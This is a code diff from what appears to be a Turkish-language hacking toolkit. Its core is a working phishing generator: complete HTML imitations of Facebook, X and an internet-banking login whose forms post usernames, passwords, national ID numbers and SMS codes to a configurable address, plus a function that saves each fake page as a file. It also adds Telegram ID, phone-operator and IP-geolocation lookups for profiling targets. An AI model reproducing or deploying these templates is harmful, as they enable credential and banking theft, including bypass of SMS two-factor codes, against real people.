         facebook:'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook</title><style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;width:380px;border-radius:8px;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer}</style></head><body><div class="box"><h1 style="color:#1877f2">facebook</h1><form action="'+u+'" method="POST"><input type="text" name="email" placeholder="E-posta" required><input type="password" name="password" placeholder="Sifre" required><button type="submit">Giris Yap</button></form></div></body></html>',
         twitter:'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>X</title><style>body{font-family:Arial;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#fff}.box{background:#000;border:1px solid #333;padding:40px;width:350px;text-align:center;border-radius:12px}input{width:100%;padding:12px;margin:8px 0;background:#000;border:1px solid #333;color:#fff;border-radius:6px;box-sizing:border-box}button{width:100%;padding:12px;background:#1d9bf0;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer}</style></head><body><div class="box"><h1>X</h1><form action="'+u+'" method="POST"><input type="text" name="username" placeholder="Kullanici adi" required><input type="password" name="password" placeholder="Sifre" required><button type="submit">Giris Yap</button></form></div></body></html>',
         bank:'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Banka</title><style>body{font-family:Arial;background:#003366;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;width:400px;border-radius:8px;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}button{width:100%;padding:12px;background:#003366;color:#fff;border:none;border-radius:4px;font-weight:bold;cursor:pointer}</style></head><body><div class="box"><h1 style="color:#003366">Internet Bankaciligi</h1><form action="'+u+'" method="POST"><input type="text" name="tc" placeholder="TC" required maxlength="11"><input type="password" name="password" placeholder="Sifre" required><input type="text" name="sms" placeholder="SMS Kodu" required><button type="submit">Giris</button></form></div></body></html>'
     };
-    document.getElementById('phishCikti').value = sablonlar[t] || sablonlar.instagram;
+    document.getElementById('phishCikti').value = s[t] || s.instagram;
     ist.phish++;istGuncelle();
 }
-function phishKaydet(){
-    var h = document.getElementById('phishCikti').value;
-    if(!h){alert('Önce oluşturun');return;}
-    var b = new Blob([h],{type:'text/html'});
-    var a = document.createElement('a');
-    a.href = URL.createObjectURL(b);
-    a.download = 'phish_'+Date.now()+'.html';
-    a.click();
-}
+function phishKaydet(){var h=document.getElementById('phishCikti').value;if(!h){alert('Önce oluşturun');return;}var b=new Blob([h],{type:'text/html'});var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='phish_'+Date.now()+'.html';a.click();}
 
+/* OPERATOR */
 var PREFIX = {'530':'Turkcell','531':'Turkcell','532':'Turkcell','533':'Turkcell','534':'Turkcell','535':'Turkcell','536':'Turkcell','537':'Turkcell','538':'Turkcell','539':'Turkcell','540':'Vodafone','541':'Vodafone','542':'Vodafone','543':'Vodafone','544':'Vodafone','545':'Vodafone','546':'Vodafone','547':'Vodafone','548':'Vodafone','549':'Vodafone','550':'Turk Telekom','551':'Turk Telekom','552':'Turk Telekom','553':'Turk Telekom','554':'Turk Telekom','555':'Turk Telekom','556':'Turk Telekom','557':'Turk Telekom','558':'Turk Telekom','559':'Turk Telekom'};
+function operatorSorgu(){var n=document.getElementById('opNumara').value.trim().replace(/\s/g,'');if(n.length<3){log('opLog','[HATA] Geçersiz numara');return;}var p=n.slice(0,3);log('opLog','────────────────────');log('opLog','Numara    : '+n);log('opLog','Prefix    : '+p);log('opLog','Operatör  : '+(PREFIX[p]||'Bilinmiyor'));log('opLog','Zaman     : '+new Date().toLocaleString('tr-TR'));ist.op++;istGuncelle();}
 
-function operatorSorgu(){
-    var n = document.getElementById('opNumara').value.trim().replace(/\s/g,'');
-    if(n.length<3){log('opLog','[HATA] Geçersiz numara');return;}
-    var p = n.slice(0,3);
-    log('opLog','────────────────────');
-    log('opLog','Numara    : '+n);
-    log('opLog','Prefix    : '+p);
-    log('opLog','Operatör  : '+(PREFIX[p]||'Bilinmiyor'));
-    log('opLog','Zaman     : '+new Date().toLocaleString('tr-TR'));
-    ist.op++;istGuncelle();
-}
+/* ID */
+function idSorgula(){var q=document.getElementById('idSorguInput').value.trim();var t=document.getElementById('tgToken').value.trim();if(!q){log('idLog','[HATA] ID gerekli');return;}if(!t){log('idLog','[HATA] Telegram token gerekli (Telegram sayfası)');return;}fetch('https://api.telegram.org/bot'+t+'/getChat?chat_id='+encodeURIComponent(q)).then(function(r){return r.json()}).then(function(d){log('idLog',JSON.stringify(d,null,2));ist.id++;istGuncelle();}).catch(function(e){log('idLog','[HATA] '+e.message);});}
 
-function idSorgula(){
-    var q = document.getElementById('idSorguInput').value.trim();
-    var t = document.getElementById('tgToken').value.trim();
-    if(!q){log('idLog','[HATA] ID gerekli');return;}
-    if(!t){log('idLog','[HATA] Telegram token gerekli');return;}
-    fetch('https://api.telegram.org/bot'+t+'/getChat?chat_id='+encodeURIComponent(q))
-    .then(function(r){return r.json()})
-    .then(function(d){log('idLog',JSON.stringify(d,null,2));ist.id++;istGuncelle()})
-    .catch(function(e){log('idLog','[HATA] '+e.message)});
-}
+/* IP DETAY */
+function ipDetay(){var ip=document.getElementById('ipInput').value.trim();var url=ip?'https://ipapi.co/'+ip+'/json/':'https://ipapi.co/json/';fetch(url).then(function(r){return r.json()}).then(function(d){log('ipLog','────────────────────');log('ipLog','IP        : '+(d.ip||'-'));log('ipLog','Ülke      : '+(d.country_name||'-'));log('ipLog','Şehir     : '+(d.city||'-'));log('ipLog','Bölge     : '+(d.region||'-'));log('ipLog','ISP       : '+(d.org||'-'));log('ipLog','Enlem     : '+(d.latitude||'-'));log('ipLog','Boylam    : '+(d.longitude||'-'));}).catch(function(){log('ipLog','[HATA] Sorgu başarısız');});}
 
-function sysTarama(){log('sysLog','[*] Tarama başlatıldı...');setTimeout(function(){log('sysLog','[+] Tamamlandı. 0 tehdit.')},800)}
-function sysOnbellek(){log('sysLog','[*] Önbellek temizleniyor...');setTimeout(function(){log('sysLog','[+] Temizlendi.')},500)}
-function sysPing(){log('sysLog','[*] Ping: 8.8.8.8');setTimeout(function(){log('sysLog','[+] Yanıt: 24ms')},700)}
-function sysBilgi(){
-    log('sysLog','Platform : '+navigator.platform);
-    log('sysLog','Dil      : '+navigator.language);
-    log('sysLog','Ekran    : '+screen.width+'x'+screen.height);
-}
-
-document.getElementById('sifre').addEventListener('keydown',function(e){if(e.key==='Enter')girisYap()});
-document.getElementById('mesajInput').addEventListener('keydown',function(e){if(e.key==='Enter')mesajGonder()});
+/* ENTER */
+document.getElementById('sifre').addEventListener('keydown',function(e){if(e.key==='Enter')girisYap();});
+document.getElementById('mesajInput').addEventListener('keydown',function(e){if(e.key==='Enter')mesajGonder();});
 
 istGuncelle();
 </script>
